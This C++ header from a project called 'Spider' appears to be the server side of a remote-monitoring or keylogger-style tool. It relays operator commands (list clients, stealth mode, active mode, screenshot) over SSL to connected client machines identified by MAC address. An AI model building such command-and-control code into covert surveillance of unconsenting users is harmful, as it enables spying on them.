//
// Created by doom on 29/09/17.
//

#ifndef SPIDER_SERVER_SHELLSESSION_HPP
#define SPIDER_SERVER_SHELLSESSION_HPP

#include <string>
#include <Server/CommandableSession.hpp>
#include <Server/SpiderClientSession.hpp>

namespace spi
{
    class ShellClientSession : public CommandableSession
    {
    public:
        ShellClientSession(net::IOManager &io, net::SSLContext &ctx, const std::vector<SpiderClientSession *> &clts) :
            CommandableSession(io, ctx, "shell-session"), _clients(clts)
        {
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::sendList, this, _1), proto::MessageType::RList);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleStealthMode, this, _1),
                                   proto::MessageType::RStealthMode);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::__handleActiveMode, this, _1),
                                   proto::MessageType::RActiveMode);
            _cmdHandler.onMessages(boost::bind(&ShellClientSession::handleScreenshot, this, _1),
                                   proto::MessageType::RScreenshot);
        }

        virtual ~ShellClientSession() noexcept
        {
        }

        void startSession() noexcept
        {
            asyncHandshake(net::SSLConnection::HandshakeType::Server,
                           boost::bind(&ShellClientSession::handleHandshake, this, net::ErrorPlaceholder));
        }

    private:
        SpiderClientSession *__findClient(const ::net::MACAddress &id)
        {
            auto it = std::find_if(_clients.begin(), _clients.end(), [&id](SpiderClientSession *cur) {
                return cur->getID() == id;
            });
            return it != _clients.end() ? *it : nullptr;
        }

        template <typename RequestT, typename MessageT>
        void __transmitRequest(const ILoggable &loggable)
        {
            const RequestT &m = static_cast<const RequestT &>(loggable);
            ErrorCode ec;
            proto::ReplyCode repCode;

            _log(logging::Level::Debug) << m.stringify() << std::endl;

            auto client = __findClient(m.addr);
            if (client) {
                MessageT toSend;

                _log(logging::Level::Debug) << "Transmitting request to client "
                                            << client->getID().toString() << std::endl;
                client->sendCommand(toSend, ec);
                repCode.code = !ec ? proto::ReplyType::OK : proto::ReplyType::KO;
            } else {
                _log(logging::Level::Warning) << "Ignoring request: unknown client " << m.addr.toString() << std::endl;
                repCode.code = proto::ReplyType::KO;
            }

            sendCommand(repCode, ec);
            if (ec)
                _errorCb(this);
        }

        void __handleStealthMode(const ILoggable &loggable)
        {
            __transmitRequest<proto::RStealthMode, proto::StealthMode>(loggable);
        }

        void __handleActiveMode(const ILoggable &loggable)
        {
            __transmitRequest<proto::RActiveMode, proto::ActiveMode>(loggable);
        }

        void handleScreenshot(const ILoggable &loggable)
        {
            __transmitRequest<proto::RScreenshot, proto::Screenshot>(loggable);
        }

        void sendList([[maybe_unused]] const ILoggable &loggable)
        {
            proto::RListReply repl;

            for (const auto &cur : _clients) {
                if (cur->hasCommandConn()) {
                    repl.connectedClients.push_back(cur->getID());
                }
            }
            Buffer buff;
            ErrorCode ec;

            repl.serializeTypeInfo(buff);
            repl.serialize(buff);
            _conn.writeSome(buff, ec);

            if (ec)
                _errorCb(this);
        }

    public:
        void sendCommand(const ILoggable &l, ErrorCode &ec) noexcept
        {
            Buffer buff;

            l.serializeTypeInfo(buff);
            l.serialize(buff);
            _conn.writeSome(buff, ec);
        }

    private:
        const std::vector<SpiderClientSession *> &_clients;
    };
}

#endif //SPIDER_SERVER_SHELLSESSION_HPP
